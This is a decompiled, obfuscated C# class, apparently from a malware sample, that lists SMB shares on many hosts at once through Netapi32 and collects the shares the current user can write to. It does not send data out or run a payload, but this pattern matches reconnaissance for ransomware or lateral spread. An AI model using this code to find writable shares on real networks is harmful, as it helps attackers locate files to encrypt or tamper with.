using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

internal sealed class ECAAhxRyDgOL
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZrfrkAMRwjAZ
	{
		public string GpHSGHbTRxDI;

		public uint SMNGogTEOPXWcR;

		public string UPvxZZrfZXp;

		public ZrfrkAMRwjAZ(string string_0, uint uint_0, string string_1)
		{
			GpHSGHbTRxDI = string_0;
			SMNGogTEOPXWcR = uint_0;
			UPvxZZrfZXp = string_1;
		}

		public override string ToString()
		{
			return GpHSGHbTRxDI;
		}
	}

	private sealed class QzMBHlfHBlO
	{
		public cvbwyAOsjCIrtCV.FSbdMmmerVmhS ApZuDRoHCGuMX;
	}

	private sealed class qVLYOUDVZen
	{
		public QzMBHlfHBlO AYppytAFAaB;

		public string vhBDbJMMqBjC;

		public void _003CGetAllShares_003Eb__1()
		{
			SWMGTUjzIlW(vhBDbJMMqBjC, AYppytAFAaB.ApZuDRoHCGuMX);
		}
	}

	public static ReaderWriterLockSlim xlubJTBCEbNK;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static ZrfrkAMRwjAZ[] NOtqaNOHPJRMA(string string_0)
	{
		List<ZrfrkAMRwjAZ> list = new List<ZrfrkAMRwjAZ>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(ZrfrkAMRwjAZ));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				ZrfrkAMRwjAZ item = (ZrfrkAMRwjAZ)Marshal.PtrToStructure(ptr, typeof(ZrfrkAMRwjAZ));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new ZrfrkAMRwjAZ(getString_0(107401745) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void SWMGTUjzIlW(string string_0, cvbwyAOsjCIrtCV.FSbdMmmerVmhS fsbdMmmerVmhS_0)
	{
		string[] source = new string[2]
		{
			getString_0(107401736),
			getString_0(107401755)
		};
		ZrfrkAMRwjAZ[] array = NOtqaNOHPJRMA(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			ZrfrkAMRwjAZ[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				ZrfrkAMRwjAZ zrfrkAMRwjAZ = array2[i];
				if (fsbdMmmerVmhS_0.mxMAjemEgAgq != null && fsbdMmmerVmhS_0.mxMAjemEgAgq.Contains(zrfrkAMRwjAZ.GpHSGHbTRxDI.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107401198), string_0, zrfrkAMRwjAZ.GpHSGHbTRxDI);
					Directory.GetFiles(text);
					list.Add(zrfrkAMRwjAZ.GpHSGHbTRxDI);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!IuKjJmfJcVBFA.SCtDlgPmJoxb.Contains(text))
							{
								IuKjJmfJcVBFA.SCtDlgPmJoxb.Add(text);
							}
							list2.Add(zrfrkAMRwjAZ.GpHSGHbTRxDI);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(zrfrkAMRwjAZ.GpHSGHbTRxDI))
					{
						list3.Add(zrfrkAMRwjAZ.GpHSGHbTRxDI);
					}
				}
			}
		}
		fbSDLYwcRmMLspop.ESFvJXgNut++;
	}

	public static void ebyNDsGQWZA(List<string> list_0, cvbwyAOsjCIrtCV.FSbdMmmerVmhS fsbdMmmerVmhS_0)
	{
		QzMBHlfHBlO qzMBHlfHBlO = new QzMBHlfHBlO();
		qzMBHlfHBlO.ApZuDRoHCGuMX = fsbdMmmerVmhS_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				qVLYOUDVZen CS_0024_003C_003E8__locals0 = new qVLYOUDVZen();
				CS_0024_003C_003E8__locals0.AYppytAFAaB = qzMBHlfHBlO;
				CS_0024_003C_003E8__locals0.vhBDbJMMqBjC = enumerator.Current;
				action = delegate
				{
					SWMGTUjzIlW(CS_0024_003C_003E8__locals0.vhBDbJMMqBjC, CS_0024_003C_003E8__locals0.AYppytAFAaB.ApZuDRoHCGuMX);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = qzMBHlfHBlO.ApZuDRoHCGuMX.zVxqjdcbnehChkIU;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static ECAAhxRyDgOL()
	{
		Strings.CreateGetStringDelegate(typeof(ECAAhxRyDgOL));
		xlubJTBCEbNK = new ReaderWriterLockSlim();
	}
}
